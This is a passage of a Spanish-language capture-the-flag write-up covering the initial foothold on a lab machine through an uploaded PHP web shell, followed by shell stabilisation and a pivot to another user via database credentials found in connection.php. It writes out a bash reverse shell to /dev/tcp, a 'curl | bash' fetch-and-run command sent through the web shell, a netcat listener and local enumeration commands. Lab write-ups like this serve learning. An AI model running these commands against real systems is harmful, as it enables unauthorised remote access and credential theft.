## Vuln exploit & Gaining Access {-}

### Ganando accesso desde la s4vishell.php {-}

1. Creamos un fichero index.html con el contenido siguiente

    ```bash
    #!/bin/bash

    bash -i >& /dev/tcp/10.10.14.15/443 0>&1
    ```

1. lanzamos un servidor web con python

    ```bash
    python3 -c http.server 80
    ```

1. nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. desde la web lanzamos el comando `http://10.10.10.73/uploads/0026-2354_e426c9e8c2f64caa/AAAAAAAAAA.......AAAA.php?cmd=curl 10.10.14.15 | bash`

ganamos accesso al systema como el usuario www-data

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

Vemos aqui que no podemos leer la flag porque no podemos entrar en las carpetas de **yossi** o de **moshe**. Tenemos que hacer un user pivoting.

### User Pivoting {-}

```bash
whoami
cd /home
cd yossi
cd moshe
sudo -l
find \-perm -4000 2/dev/null
cd /var/www/html
ls
cat connection.php
```

Aqui vemos que no tenemos permisos interesantes pero vemos en el ficher `connection.php` unas credenciales para el usuario `moshe` para la base de datos.

```bash
su moshe
Password:

whoami
#Output
moshe

cat /home/moshe/user.txt
```

Ahora que tenemos la flag, pasamos a la parte **PrivEsc**
